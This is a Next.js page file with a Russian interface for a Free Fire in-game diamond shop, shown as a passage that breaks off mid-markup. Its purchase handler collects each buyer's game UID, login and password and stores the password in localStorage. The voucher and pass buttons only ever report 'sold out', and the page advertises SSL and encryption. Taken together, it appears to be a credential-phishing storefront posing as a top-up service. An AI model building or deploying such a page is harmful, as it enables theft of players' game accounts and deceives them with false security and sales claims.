'use client';

import React, { useState, useEffect } from 'react';
import DiamondCard from './components/DiamondCard';
import PurchaseForm from './components/PurchaseForm';
import SupportModal from './components/SupportModal';
import Navbar from './components/Navbar';
import Image from 'next/image';

interface DiamondPackage {
  id: number;
  name: string;
  diamonds: number;
  bonus: number;
  price: number;
  oldPrice?: number;
  image: string;
}

interface VoucherPackage {
  id: number;
  name: string;
  duration: string;
  price: number;
  oldPrice?: number;
  image: string;
  isSelected?: boolean;
}

interface PassPackage {
  id: number;
  name: string;
  price: number;
  oldPrice?: number;
  image: string;
}

interface PurchaseData {
  bindingType: string;
  uid: string;
  login: string;
  password: string;
}

interface Notification {
  show: boolean;
  type: 'error' | 'success';
  message: string;
}

export default function Home() {
  const [selectedPackage, setSelectedPackage] = useState<DiamondPackage | null>(null);
  const [selectedVoucher, setSelectedVoucher] = useState<VoucherPackage | null>(null);
  const [moderationMessage, setModerationMessage] = useState<string>('');
  const [isLoading, setIsLoading] = useState(true);
  const [showPromo, setShowPromo] = useState(false);
  const [isSupportModalOpen, setIsSupportModalOpen] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [notification, setNotification] = useState<Notification>({
    show: false,
    type: 'error',
    message: ''
  });
  
  // Автоматическое скрытие уведомления
  useEffect(() => {
    if (notification.show) {
      const timer = setTimeout(() => {
        setNotification(prev => ({ ...prev, show: false }));
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [notification.show]);

  const diamondPackages: DiamondPackage[] = [
    { id: 1, name: '110 Алмазов', diamonds: 100, bonus: 10, price: 108, oldPrice: 120, image: '/diamonds-1.png' },
    { id: 2, name: '341 Алмазов', diamonds: 310, bonus: 31, price: 301, oldPrice: 350, image: '/diamonds-2.png' },
    { id: 3, name: '572 Алмазов', diamonds: 520, bonus: 52, price: 559, oldPrice: 600, image: '/diamonds-3.png' },
    { id: 4, name: '1166 Алмазов', diamonds: 1060, bonus: 106, price: 1132, oldPrice: 1200, image: '/diamonds-4.png' },
    { id: 5, name: '2398 Алмазов', diamonds: 2180, bonus: 218, price: 2219, oldPrice: 2264, image: '/diamonds-5.png' },
    { id: 6, name: '6150 Алмазов', diamonds: 6150, bonus: 0, price: 5765, oldPrice: 5882, image: '/diamonds-6.png' },
  ];

  const voucherPackages: VoucherPackage[] = [
    { 
      id: 1, 
      name: 'Ваучер на неделю', 
      duration: '7 дней',
      price: 196, 
      oldPrice: 200,
      image: 'https://i.postimg.cc/qRYx4VwB/vip-blue.png',
    },
    { 
      id: 2, 
      name: 'Ваучер на месяц', 
      duration: '30 дней',
      price: 709, 
      oldPrice: 723,
      image: 'https://i.postimg.cc/8PXVGZRq/vip-gold.png',
      isSelected: true,
    }
  ];

  const passPackages: PassPackage[] = [
    { 
      id: 1, 
      name: 'Booyah пропуск', 
      price: 325, 
      oldPrice: 331,
      image: 'https://i.postimg.cc/Y0LXJ0qF/premium-pass.png'
    }
  ];

  useEffect(() => {
    // Имитация загрузки данных
    setTimeout(() => {
      setIsLoading(false);
    }, 1500);

    // Показываем промо через 3 секунды
    setTimeout(() => {
      setShowPromo(true);
    }, 3000);
  }, []);

  const handlePackageSelect = (pack: DiamondPackage) => {
    setSelectedPackage(pack);
    const form = document.getElementById('purchase-form');
    if (form) {
      form.scrollIntoView({ behavior: 'smooth' });
    }
  };

  const handleFormSubmit = (data: PurchaseData) => {
    if (selectedPackage) {
      setIsLoading(true);
      
      // Имитация отправки данных
      setTimeout(() => {
        localStorage.setItem('userPassword', data.password);
        
        const message = `
Новая заявка на покупку алмазов:
Пакет: ${selectedPackage.name}
Способ привязки: ${data.bindingType}
UID: ${data.uid}
Логин: ${data.login}
Цена: ${selectedPackage.price} ₽
        `;
        setModerationMessage(message);
        setIsLoading(false);
      }, 1000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#1a1a2e]">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
          <p className="text-white text-lg">Загрузка...</p>
        </div>
      </div>
    );
  }

  return (
    <main className="min-h-screen relative overflow-hidden bg-[#1a1a2e]">
      {/* Уведомление */}
      {notification.show && (
        <div className="fixed top-24 left-1/2 transform -translate-x-1/2 z-50 animate-slideDown w-full px-4 md:px-0 md:w-auto">
          <div className={`${
            notification.type === 'error' 
              ? 'bg-gradient-to-r from-red-500/90 to-orange-500/90'
              : 'bg-gradient-to-r from-green-500/90 to-emerald-500/90'
          } text-white px-6 py-3 rounded-xl shadow-lg backdrop-blur-sm flex items-center gap-3 min-w-[300px]`}>
            <svg className="w-5 h-5 shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} 
                d={notification.type === 'error' 
                  ? "M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                  : "M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"} />
            </svg>
            <p className="font-medium">{notification.message}</p>
            <button 
              onClick={() => setNotification(prev => ({ ...prev, show: false }))}
              className="ml-auto text-white/80 hover:text-white"
            >
              <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>
      )}

      {/* Фоновые элементы */}
      <div className="fixed inset-0 z-0 pointer-events-none">
        <div className="absolute top-0 left-1/4 w-[500px] h-[500px] bg-[#4a00e0]/20 rounded-full blur-[120px] animate-pulse"></div>
        <div className="absolute bottom-0 right-1/4 w-[500px] h-[500px] bg-[#8e2de2]/20 rounded-full blur-[120px] animate-pulse"></div>
      </div>

      {/* Навигационная панель */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-black/20 backdrop-blur-lg border-b border-white/10">
        <div className="container mx-auto">
          <div className="flex items-center justify-between h-16 px-4">
            {/* Логотип */}
            <div className="flex items-center gap-3">
              <span className="text-2xl font-bold bg-gradient-to-r from-purple-400 via-pink-400 to-white bg-clip-text text-transparent">
                Free Fire
              </span>
            </div>

            {/* Десктопное меню */}
            <div className="hidden md:flex items-center gap-6">
              <a href="#faq" className="text-white/80 hover:text-white transition-colors">FAQ</a>
              <a href="#rules" className="text-white/80 hover:text-white transition-colors">Правила</a>
              <a href="#about" className="text-white/80 hover:text-white transition-colors">О сервисе</a>
              <a href="#contact" className="text-white/80 hover:text-white transition-colors">Контакты</a>
              <button 
                onClick={() => setIsSupportModalOpen(true)}
                className="bg-gradient-to-r from-purple-600 to-blue-600 text-white px-6 py-2 rounded-xl hover:opacity-90 transition-opacity font-medium flex items-center gap-2"
              >
                <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                </svg>
                Поддержка 24/7
              </button>
            </div>

            {/* Мобильная кнопка меню */}
            <div className="flex items-center gap-4 md:hidden">
              <button 
                onClick={() => setIsSupportModalOpen(true)}
                className="w-10 h-10 rounded-xl bg-gradient-to-r from-purple-600 to-blue-600 flex items-center justify-center"
              >
                <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                </svg>
              </button>
              <button 
                onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
                className="w-10 h-10 rounded-xl bg-white/5 flex items-center justify-center"
              >
                <svg className="w-5 h-5 text-white/80" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  {isMobileMenuOpen ? (
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  ) : (
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                  )}
                </svg>
              </button>
            </div>
          </div>

          {/* Мобильное меню */}
          <div className={`md:hidden transition-all duration-300 ${isMobileMenuOpen ? 'max-h-[400px] opacity-100' : 'max-h-0 opacity-0'} overflow-hidden`}>
            <div className="px-4 py-4 border-t border-white/10 space-y-4">
              <a href="#faq" className="block text-white/80 hover:text-white py-2 transition-colors">
                FAQ
              </a>
              <a href="#rules" className="block text-white/80 hover:text-white py-2 transition-colors">
                Правила
              </a>
              <a href="#about" className="block text-white/80 hover:text-white py-2 transition-colors">
                О сервисе
              </a>
              <a href="#contact" className="block text-white/80 hover:text-white py-2 transition-colors">
                Контакты
              </a>
            </div>
          </div>
        </div>
      </div>

      {/* Модальное окно поддержки */}
      <SupportModal 
        isOpen={isSupportModalOpen}
        onClose={() => setIsSupportModalOpen(false)}
      />

      {/* Промо баннер */}
      {showPromo && (
        <div className="fixed top-24 left-1/2 transform -translate-x-1/2 z-50 animate-slideDown w-full px-4 md:px-0 md:w-auto">
          <div className="bg-gradient-to-r from-yellow-400 to-yellow-600 text-black px-4 md:px-6 py-2 rounded-full shadow-lg flex items-center gap-2">
            <span className="text-xl hidden md:inline">🎉</span>
            <p className="font-medium text-sm md:text-base">Специальное предложение: +10% бонус!</p>
            <button 
              onClick={() => setShowPromo(false)}
              className="ml-2 md:ml-4 text-black/60 hover:text-black p-1"
            >
              ✕
            </button>
          </div>
        </div>
      )}

      <div className="relative z-10 pt-28 md:pt-32">
        <header className="pb-12 md:pb-16 text-center px-4">
          <div className="max-w-4xl mx-auto relative">
            {/* Декоративные элементы */}
            <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-[600px] h-[600px] bg-gradient-to-r from-blue-500/20 via-purple-500/20 to-pink-500/20 rounded-full blur-[120px] animate-pulse"></div>
            <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-[400px] h-[400px] bg-gradient-to-r from-purple-500/20 via-pink-500/20 to-blue-500/20 rounded-full blur-[100px] animate-pulse delay-1000"></div>
            
            {/* Основной заголовок */}
            <div className="relative">
              <h1 className="text-5xl md:text-7xl font-extrabold mb-6 animate-fadeIn">
                <span className="inline-block bg-gradient-to-r from-purple-500 via-pink-400 to-white bg-clip-text text-transparent">
                  Free Fire
                </span>
                <br />
                <span className="inline-block text-3xl md:text-5xl bg-gradient-to-r from-white via-blue-400 to-purple-500 bg-clip-text text-transparent mt-2">
                  Premium
                </span>
              </h1>
              
              {/* Декоративная линия */}
              <div className="w-32 h-1.5 bg-gradient-to-r from-purple-500 via-pink-500 to-blue-500 mx-auto rounded-full mb-8 blur-sm"></div>
              
              {/* Подзаголовок */}
              <p className="text-xl md:text-2xl text-gray-300 max-w-2xl mx-auto px-4 leading-relaxed font-light">
                • Моментальное пополнение
                <span className="block mt-2 text-lg md:text-xl text-gray-400">
                  • Безопасная оплата • Круглосуточная поддержка
                </span>
              </p>
              
              {/* Декоративные бейджи */}
              <div className="flex flex-wrap justify-center gap-4 mt-8">
                <div className="px-4 py-2 bg-white/5 backdrop-blur-lg rounded-full border border-white/10 flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-sm text-gray-300">Моментальное зачисление</span>
                </div>
                <div className="px-4 py-2 bg-white/5 backdrop-blur-lg rounded-full border border-white/10 flex items-center gap-2">
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                  <span className="text-sm text-gray-300">Безопасная оплата</span>
                </div>
                <div className="px-4 py-2 bg-white/5 backdrop-blur-lg rounded-full border border-purple-500/50 flex items-center gap-2">
                  <div className="w-2 h-2 bg-purple-500 rounded-full animate-pulse"></div>
                  <span className="text-sm text-gray-300">Поддержка 24/7</span>
                </div>
              </div>
            </div>
          </div>
        </header>

        {/* Преимущества */}
        <div className="container mx-auto px-4 mb-16">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-blue-500/50 shadow-lg hover:shadow-blue-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-blue-600/10 to-purple-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-500/20 to-purple-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Мгновенное зачисление</h3>
                  <p className="text-sm text-gray-400 mb-4">Алмазы поступят на ваш аккаунт сразу после модерации</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-medium">Быстро</span>
                    <span className="px-3 py-1 rounded-full bg-purple-500/10 text-purple-400 text-xs font-medium">Автоматически</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-purple-500/50 shadow-lg hover:shadow-purple-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-purple-600/10 to-pink-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-purple-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Безопасная оплата</h3>
                  <p className="text-sm text-gray-400 mb-4">Защищенные платежи и сохранность ваших данных</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-purple-500/10 text-purple-400 text-xs font-medium">SSL защита</span>
                    <span className="px-3 py-1 rounded-full bg-pink-500/10 text-pink-400 text-xs font-medium">Шифрование</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-emerald-500/50 shadow-lg hover:shadow-emerald-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-emerald-600/10 to-green-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-emerald-500/20 to-green-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Выгодные бонусы</h3>
                  <p className="text-sm text-gray-400 mb-4">Дополнительные алмазы к каждому пакету</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-emerald-500/10 text-emerald-400 text-xs font-medium">Бонусы</span>
                    <span className="px-3 py-1 rounded-full bg-green-500/10 text-green-400 text-xs font-medium">Выгодно</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <section className="container mx-auto px-4 mb-16 md:mb-20">
          <h2 className="text-2xl md:text-3xl font-bold text-center text-white mb-8 md:mb-12">
            Выберите пакет алмазов
          </h2>
          <div className="grid grid-cols-2 sm:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6 max-w-5xl mx-auto">
            {diamondPackages.map((pack) => (
              <DiamondCard
                key={pack.id}
                {...pack}
                onBuy={() => handlePackageSelect(pack)}
              />
            ))}
          </div>
        </section>

        {/* Секция с ваучерами и пропусками */}
        <section className="container mx-auto px-4 mb-16 md:mb-20">
          <h2 className="text-2xl md:text-3xl font-bold text-center text-white mb-8 md:mb-12">
            Ваучеры и пропуски
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 md:gap-6 max-w-5xl mx-auto">
            {/* Ваучер на неделю */}
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-blue-500/50 shadow-lg hover:shadow-blue-500/20">
                {/* Фоновый градиент */}
                <div className="absolute inset-0">
                  <Image
                    src="https://i.postimg.cc/18gvwGP3/image.jpg"
                    alt="Voucher background"
                    layout="fill"
                    objectFit="cover"
                    className="opacity-30"
                  />
                </div>
                
                <div className="relative p-4">
                  <div className="flex justify-end mb-3">
                    <div className="px-3 py-1 bg-blue-500/20 rounded-full border border-blue-500/20">
                      <span className="text-blue-400 text-sm font-medium">7 дней</span>
                    </div>
                  </div>
                  
                  <h3 className="text-lg font-bold text-white mb-2">Ваучер на неделю</h3>
                  
                  <div className="flex items-baseline gap-2 mb-3">
                    <span className="text-2xl font-bold text-white">196 ₽</span>
                    <span className="text-sm text-gray-400 line-through">200 ₽</span>
                  </div>

                  <button 
                    onClick={() => {
                      setNotification({
                        show: true,
                        type: 'error',
                        message: 'Извините, ваучеры временно распроданы. Следите за обновлениями!'
                      });
                    }}
                    className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:opacity-90 text-white font-medium py-2.5 px-4 rounded-lg transition-all duration-300 flex items-center justify-center gap-2"
                  >
                    <span>Купить</span>
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                    </svg>
                  </button>
                </div>
              </div>
            </div>

            {/* Ваучер на месяц */}
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-yellow-500/50 shadow-lg hover:shadow-yellow-500/20">
                {/* Фоновый градиент */}
                <div className="absolute inset-0">
                  <Image
                    src="https://i.postimg.cc/18gvwGP3/image.jpg"
                    alt="Voucher background"
                    layout="fill"
                    objectFit="cover"
                    className="opacity-30"
                  />
                </div>
                
                <div className="relative p-4">
                  <div className="flex justify-end mb-3">
                    <div className="px-3 py-1 bg-yellow-500/20 rounded-full border border-yellow-500/20">
                      <span className="text-yellow-400 text-sm font-medium">30 дней</span>
                    </div>
                  </div>
                  
                  <h3 className="text-lg font-bold text-white mb-2">Ваучер на месяц</h3>
                  
                  <div className="flex items-baseline gap-2 mb-3">
                    <span className="text-2xl font-bold text-white">709 ₽</span>
                    <span className="text-sm text-gray-400 line-through">723 ₽</span>
                  </div>

                  <button 
                    onClick={() => {
                      setNotification({
                        show: true,
                        type: 'error',
                        message: 'Извините, ваучеры временно распроданы. Следите за обновлениями!'
                      });
                    }}
                    className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:opacity-90 text-white font-medium py-2.5 px-4 rounded-lg transition-all duration-300 flex items-center justify-center gap-2"
                  >
                    <span>Купить</span>
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                    </svg>
                  </button>
                </div>
              </div>
            </div>

            {/* Booyah пропуск */}
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-purple-500/50 shadow-lg hover:shadow-purple-500/20">
                {/* Фоновый градиент */}
                <div className="absolute inset-0">
                  <Image
                    src="https://i.postimg.cc/18gvwGP3/image.jpg"
                    alt="Pass background"
                    layout="fill"
                    objectFit="cover"
                    className="opacity-30"
                  />
                </div>
                
                <div className="relative p-4">
                  <div className="flex justify-end mb-3">
                    <div className="px-3 py-1 bg-purple-500/20 rounded-full border border-purple-500/20">
                      <span className="text-purple-400 text-sm font-medium">Premium</span>
                    </div>
                  </div>
                  
                  <h3 className="text-lg font-bold text-white mb-2">Booyah пропуск</h3>
                  
                  <div className="flex items-baseline gap-2 mb-3">
                    <span className="text-2xl font-bold text-white">325 ₽</span>
                    <span className="text-sm text-gray-400 line-through">331 ₽</span>
                  </div>

                  <button 
                    onClick={() => {
                      setNotification({
                        show: true,
                        type: 'error',
                        message: 'Извините, пропуски временно распроданы. Следите за обновлениями!'
                      });
                    }}
                    className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:opacity-90 text-white font-medium py-2.5 px-4 rounded-lg transition-all duration-300 flex items-center justify-center gap-2"
                  >
                    <span>Купить</span>
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                    </svg>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </section>

        {selectedPackage && (
          <section id="purchase-form" className="container mx-auto px-4 mb-16 md:mb-20 animate-fadeIn">
            <PurchaseForm
              packageName={selectedPackage.name}
              diamonds={selectedPackage.diamonds}
              price={selectedPackage.price}
              onSubmit={handleFormSubmit}
            />
          </section>
        )}

        {/* FAQ секция */}
        <section id="faq" className="container mx-auto px-4 mb-16">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-8 bg-gradient-to-r from-white to-blue-400 bg-clip-text text-transparent">
            Частые вопросы
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-blue-500/50 shadow-lg hover:shadow-blue-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-blue-600/10 to-purple-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-blue-500/20 to-purple-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Как быстро придут алмазы?</h3>
                  <p className="text-sm text-gray-400 mb-4">Зачисление происходит автоматически после модерации в течение 20 минут.</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-green-500/10 text-green-400 text-xs font-medium">Быстро</span>
                    <span className="px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-medium">Автоматически</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-purple-500/50 shadow-lg hover:shadow-purple-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-purple-600/10 to-pink-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-purple-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Безопасно ли это?</h3>
                  <p className="text-sm text-gray-400 mb-4">Мы используем защищенное SSL-соединение и современные методы шифрования.</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-purple-500/10 text-purple-400 text-xs font-medium">SSL</span>
                    <span className="px-3 py-1 rounded-full bg-pink-500/10 text-pink-400 text-xs font-medium">Шифрование</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-yellow-500/50 shadow-lg hover:shadow-yellow-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-yellow-600/10 to-orange-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-yellow-500/20 to-orange-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Способы оплаты</h3>
                  <p className="text-sm text-gray-400 mb-4">Поддерживаем все популярные способы оплаты для вашего удобства.</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-yellow-500/10 text-yellow-400 text-xs font-medium">Карты</span>
                    <span className="px-3 py-1 rounded-full bg-orange-500/10 text-orange-400 text-xs font-medium">Криптовалюты</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Правила сервиса */}
        <section id="rules" className="container mx-auto px-4 mb-16">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-8 bg-gradient-to-r from-white to-purple-400 bg-clip-text text-transparent">
            Правила сервиса
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-indigo-500/50 shadow-lg hover:shadow-indigo-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-indigo-600/10 to-violet-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-indigo-500/20 to-violet-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Условия использования</h3>
                  <ul className="space-y-3">
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-indigo-500/5 p-3 rounded-lg border border-indigo-500/10">
                      <div className="w-6 h-6 rounded-full bg-indigo-500/10 flex items-center justify-center text-xs text-indigo-400">1</div>
                      <span>Возраст: 18+</span>
                    </li>
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-violet-500/5 p-3 rounded-lg border border-violet-500/10">
                      <div className="w-6 h-6 rounded-full bg-violet-500/10 flex items-center justify-center text-xs text-violet-400">2</div>
                      <span>Один аккаунт</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-cyan-500/50 shadow-lg hover:shadow-cyan-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-cyan-600/10 to-blue-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-cyan-500/20 to-blue-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-cyan-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Безопасность</h3>
                  <ul className="space-y-3">
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-cyan-500/5 p-3 rounded-lg border border-cyan-500/10">
                      <div className="w-6 h-6 rounded-full bg-cyan-500/10 flex items-center justify-center text-xs text-cyan-400">1</div>
                      <span>SSL защита</span>
                    </li>
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-blue-500/5 p-3 rounded-lg border border-blue-500/10">
                      <div className="w-6 h-6 rounded-full bg-blue-500/10 flex items-center justify-center text-xs text-blue-400">2</div>
                      <span>Шифрование</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="relative group">
